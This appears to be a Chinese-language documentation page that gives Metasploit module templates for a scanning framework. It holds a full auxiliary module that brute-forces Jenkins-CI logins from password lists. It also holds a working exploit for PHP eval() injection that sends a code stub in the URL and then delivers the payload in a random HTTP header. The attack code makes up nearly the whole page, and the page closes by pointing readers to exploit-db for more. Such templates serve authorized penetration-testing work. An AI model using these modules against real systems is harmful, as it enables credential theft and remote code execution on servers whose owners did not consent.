模板代码
========

辅助模块例子
^^^^^^^^^^^^

辅助模块不会在自动扫描中调用，可以在metasploit的模块功能中使用，或msfconsole中直接使用。
::

    require 'msf/core'
    require 'metasploit/framework/credential_collection'
    require 'metasploit/framework/login_scanner/jenkins'
    
    class Metasploit3 < Msf::Auxiliary
      include Msf::Auxiliary::Scanner
      include Msf::Exploit::Remote::HttpClient
      include Msf::Auxiliary::Report
      include Msf::Auxiliary::AuthBrute
    
    
      def initialize
        super(
          'Name'           => 'Jenkins-CI Login Utility',
          'Description'    => 'This module attempts to login to a Jenkins-CI instance using a specific user/pass.',
          'Author'         => [ 'Nicholas Starke <starke.nicholas[at]gmail.com>' ],
          'License'        => MSF_LICENSE
        )
    
        register_options(
          [
            OptString.new('LOGIN_URL', [true, 'The URL that handles the login process', '/j_acegi_security_check']),
            OptEnum.new('HTTP_METHOD', [true, 'The HTTP method to use for the login', 'POST', ['GET', 'POST']]),
            Opt::RPORT(8080)
          ], self.class)
    
        register_autofilter_ports([ 80, 443, 8080, 8081, 8000 ])
        deregister_options('RHOST')
      end
    
      def run_host(ip)
        cred_collection = Metasploit::Framework::CredentialCollection.new(
          blank_passwords: datastore['BLANK_PASSWORDS'],
          pass_file: datastore['PASS_FILE'],
          password: datastore['PASSWORD'],
          user_file: datastore['USER_FILE'],
          userpass_file: datastore['USERPASS_FILE'],
          username: datastore['USERNAME'],
          user_as_pass: datastore['USER_AS_PASS']
        )
    
        scanner = Metasploit::Framework::LoginScanner::Jenkins.new(
          configure_http_login_scanner(
            uri: datastore['LOGIN_URL'],
            method: datastore['HTTP_METHOD'],
            cred_details: cred_collection,
            stop_on_success: datastore['STOP_ON_SUCCESS'],
            bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
            connection_timeout: 10
          )
        )
    
        scanner.scan! do |result|
          credential_data = result.to_h
          credential_data.merge!(
              module_fullname: fullname,
              workspace_id: myworkspace_id
          )
          if result.success?
            credential_core = create_credential(credential_data)
            credential_data[:core] = credential_core
            create_credential_login(credential_data)
            print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
          else
            invalidate_login(credential_data)
            vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
          end
        end
      end
    end

利用模块例子
^^^^^^^^^^^^

利用模块在自动扫描中会自动调用扫描目标机器。
::

    require 'msf/core'
    class Metasploit3 < Msf::Exploit::Remote
      Rank = ManualRanking
      include Msf::Exploit::Remote::HttpClient
      def initialize(info = {})
        super(update_info(info,
          'Name'           => 'Generic PHP Code Evaluation',
          'Description'    => %q{
            Exploits things like <?php eval($_REQUEST['evalme']); ?>
            It is likely that HTTP evasion options will break this exploit.
          },
          'Author'         => [ 'egypt' ],
          'License'        => BSD_LICENSE,
          'References'     => [ ],
          'Privileged'     => false,
          'Platform'       => ['php'],
          'Arch'           => ARCH_PHP,
          'Payload'        =>
            {
    
              # max header length for Apache,
              # http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
              'Space'       => 8190,
    
              # max url length for some old versions of apache according to
              # http://www.boutell.com/newfaq/misc/urllength.html
              #'Space'       => 4000,
              'DisableNops' => true,
              'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
              'Compat'      =>
                                       {
                  'ConnectionType' => 'find',
                },
              'Keys'        => ['php'],
            },
          'DisclosureDate' => 'Oct 13 2008',
          'Targets'        => [ ['Automatic', { }], ],
          'DefaultTarget' => 0
          ))
        register_options(
          [
            OptString.new('URIPATH',   [ true,  "The URI to request, with the eval()'d parameter changed to !CODE!", '/test.php?evalme=!CODE!']),
          ], self.class)
      end
      def check
        uri = datastore['PHPURI'].gsub(/\?.*/, "")
        print_status("Checking uri #{uri}")
        response = send_request_raw({ 'uri' => uri})
        if response.code == 200
          return Exploit::CheckCode::Detected
        end
        vprint_error("Server responded with #{response.code}")
        return Exploit::CheckCode::Safe
      end
      def exploit
        # very short timeout because the request may never return if we're
        # sending a socket payload
        timeout = 0.01
        headername = "X-" + Rex::Text.rand_text_alpha_upper(rand(10)+10)
        stub = "error_reporting(0);eval($_SERVER[HTTP_#{headername.gsub("-", "_")}]);"
        uri = datastore['URIPATH'].sub("!CODE!", Rex::Text.uri_encode(stub))
        print_status("Sending request for: http#{ssl ? "s" : ""}://#{rhost}:#{rport}#{uri}")
        print_status("Payload will be in a header called #{headername}")
        response = send_request_raw({
            'global' => true,
            'uri' => uri,
            'headers' => {
                headername => payload.encoded,
                'Connection' => 'close'
              }
          },timeout)
        if response and response.code != 200
          print_error("Server returned non-200 status code (#{response.code})")
        end
        handler
      end
    end

.. note::

    更多模板代码请在https://www.exploit-db.com/search/或其它网站中搜索，也可在本地环境中（/opt/metasploit/apps/pro/msf3/modules/）查看框架自身集成好的模块代码